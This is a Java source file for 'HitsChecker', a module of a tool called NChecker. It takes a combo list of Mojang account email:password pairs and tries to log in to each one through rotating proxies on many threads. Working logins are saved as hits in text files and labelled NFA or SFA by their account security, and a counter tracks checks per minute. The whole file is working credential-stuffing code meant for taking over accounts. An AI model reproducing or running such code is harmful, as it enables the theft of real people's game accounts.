package dev.tolja.Checkers.Modules;

import dev.tolja.Checkers.Checker;
import dev.tolja.Checkers.OutputManager;
import dev.tolja.Configuration.ConfigManager;
import dev.tolja.Data.MojangAccount;
import dev.tolja.Data.ProxyInfo;
import dev.tolja.Nchecker;
import dev.tolja.Utils.IOUtils;
import dev.tolja.Utils.MojangUtils;
import org.fusesource.jansi.Ansi;
import org.fusesource.jansi.AnsiConsole;
import org.fusesource.jansi.internal.Kernel32;

import java.io.File;
import java.net.Proxy;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicInteger;

public class HitsChecker extends Checker {
    private final AtomicInteger checked = new AtomicInteger();
    private final AtomicInteger fails = new AtomicInteger();
    private final AtomicInteger hits = new AtomicInteger();
    public void runChecker() {
        ConfigManager configManager = Nchecker.getConfigManager();
        Object[] resources = IOUtils.loadResources(true, configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT, true);
        if (resources == null) return;
        List<ProxyInfo> proxies = (List<ProxyInfo>) resources[0];
        List<MojangAccount> combos = (List<MojangAccount>) resources[1];
        OutputManager outputManager = new OutputManager(new File(".", "results/HitsChecker/"), "7");
        long startTime = System.currentTimeMillis();
        Kernel32.SetConsoleTitle("NChecker | Starting thread...");
        ExecutorService threadPool = Executors.newFixedThreadPool(configManager.getSettingsConfig().getThreads());

        for (MojangAccount account : combos) {
            Future<?> submit = threadPool.submit(new Runnable() {
                public void run() {
                    int recheckCount = 0;

                    do {
                        if (configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT) {
                            MojangUtils.loginAccount(account, configManager.getSettingsConfig().getTimeout(), configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT ? proxies.get(new Random().nextInt(proxies.size())) : null);
                        } else {
                            MojangUtils.loginAccount(account, configManager.getSettingsConfig().getTimeout());
                        }
                    } while (!account.isCracked() && configManager.getSettingsConfig().getMaxRecheckCount() > recheckCount++);

                    if (account.isCracked()) {
                        recheckCount = 0;
                        account.setSecurity(MojangUtils.isSFA(account, configManager.getSettingsConfig().getTimeout()));
                        hits.getAndIncrement();
                        outputManager.writeLine("Hits.txt", account.getAccount() + ":" + account.getPassword());
                        AnsiConsole.out().println(Ansi.ansi().fgBrightGreen().a("[" + (account.isSecurity() ? "NFA" : "SFA") + "] " + account.getAccount() + ":" + account.getPassword()).reset());
                        outputManager.writeLine("Hits.txt", account.getAccount() + ":" + account.getPassword());
                        outputManager.writeLine((account.isSecurity() ? "NFA.txt" : "SFA.txt"), account.getAccount() + ":" + account.getPassword() + ":" + account.getPlayerName());
                    } else {
                        fails.getAndIncrement();
                        if (configManager.getSettingsConfig().isPrintFailed()) {
                            AnsiConsole.out().println(Ansi.ansi().fgBrightRed().a("[Failed] " + account.getAccount() + ":" + account.getPassword()).reset());
                        }
                        if (configManager.getSettingsConfig().isSaveFailed()) {
                            outputManager.writeLine("Failed.txt", account.getAccount() + ":" + account.getPassword());
                        }
                    }
                    checked.getAndIncrement();
                }
            });
        }
        threadPool.shutdown();
        SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
        while (!threadPool.isTerminated()) {
            try {
                int time = (int) ((System.currentTimeMillis() - startTime) / 1000);
                Kernel32.SetConsoleTitle("NChecker"
                        + " | Checked: " + checked.get() + "/" + combos.size() + " (" + String.format("%.2f", (double) checked.get() / combos.size() * 100) + "%)"
                        + " | Hits: " + hits.get() + " - " + "Failed: " + fails.get() + "| Cpm: " + (int) Math.ceil((double) checked.get() / time * 60)
                        + " | Elapsed: " + dateFormat.format(new Date(System.currentTimeMillis() - startTime - (8 * 60 * 60 * 1000))));
                Thread.sleep(1000);
            } catch (Exception ignored) {
            }
        }
        Kernel32.SetConsoleTitle("NChecker | Ver " + Nchecker.VERSION);
        AnsiConsole.out.println(Ansi.ansi().fg(Ansi.Color.CYAN).a(
                "\r\nAll done.\r\n"
                        + "Hits: " + hits.get() + " - " + "Failed: " + fails.get()
                        + " | Elapsed: " + dateFormat.format(new Date(System.currentTimeMillis() - startTime - (8 * 60 * 60 * 1000)))
        ).reset());
    }

}
